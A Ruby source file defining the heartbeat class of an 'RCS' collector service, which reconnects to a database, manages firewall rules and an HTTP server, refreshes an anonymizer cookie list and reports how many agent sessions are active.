require 'rcs-common/trace'
require 'rcs-common/systemstatus'
require 'rcs-common/heartbeat'
require 'rcs-common/winfirewall'

require_relative 'sessions'
require_relative 'firewall'

module RCS
  module Collector
    class HeartBeat < RCS::HeartBeat::Base
      component :collector

      attr_reader :firewall_error_message

      before_heartbeat do
        # if the database connection has gone
        # try to re-login to the database again
        unless DB.instance.connected?
          trace :debug, "heartbeat: try to reconnect to rcs-db"
          DB.instance.connect!(:collector)
        end

        @firewall_error_message = Firewall.error_message

        # still no luck ?  return and wait for the next iteration
        DB.instance.connected?
      end

      after_heartbeat do
        if firewall_error_message
          trace(:error, "#{firewall_error_message}. The http server will #{HttpServer.running? ? 'stop now' : 'remain disabled'}")
          HttpServer.stop
        elsif !HttpServer.running?
          Firewall.create_default_rules
          HttpServer.start
        elsif Firewall.first_anonymizer_changed?
          Firewall.create_default_rules
        end

        # retrieve the anon cookie list
        DB.instance.anon_cookies(force = true)
      end

      def status
        return 'ERROR' if firewall_error_message
        super()
      end

      def message
        return firewall_error_message if firewall_error_message

        # retrieve how many session we have
        # this number represents the number of agent that are synchronizing
        active_sessions = SessionManager.instance.length

        # if we are serving agents, report it accordingly
        message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
      end
    end
  end
end
